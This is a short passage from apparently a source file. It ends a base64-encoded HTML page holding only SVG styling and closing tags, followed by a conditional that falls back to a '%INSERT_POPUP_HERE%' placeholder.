l0ZXJsaW1pdDogMTA7IGZpbGw6IHJnYigyMzggMTY2IDk0KTsgZmlsbC1ydWxlOiBub256ZXJvOyBvcGFjaXR5OiAxOyIgdHJhbnNmb3JtPSIgbWF0cml4KDEgMCAwIDEgMCAwKSAiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgLz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2c+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2c+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvc3ZnPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CjwvYm9keT4KPC9odG1sPg==" else "%INSERT_POPUP_HERE%"
        }
    }

}

